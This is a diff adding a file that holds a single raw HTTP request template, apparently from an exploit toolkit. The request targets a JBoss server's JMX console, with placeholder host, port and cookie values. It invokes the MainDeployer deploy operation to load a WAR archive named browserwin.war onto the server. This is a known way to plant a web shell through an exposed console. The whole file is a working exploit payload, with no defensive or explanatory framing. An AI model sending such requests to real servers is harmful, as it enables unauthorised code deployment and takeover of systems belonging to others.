@@ -1,0 +1,14 @@
+POST http://hostx:portx/jmx-console/HtmlAdaptor HTTP/1.1
+Host: hostx:portx
+User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1b4) Gecko/20090427 Fedora/3.5-0.20.beta4.fc11 Firefox/3.5b4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Referer: http://hostx:portx/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system%3Aservice%3DMainDeployer
+Cookie: cookiex
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 102
+
+action=invokeOp&name=jboss.system%3Aservice%3DMainDeployer&methodIndex=2&arg0=c%3A%5C%5Cbrowserwin.war
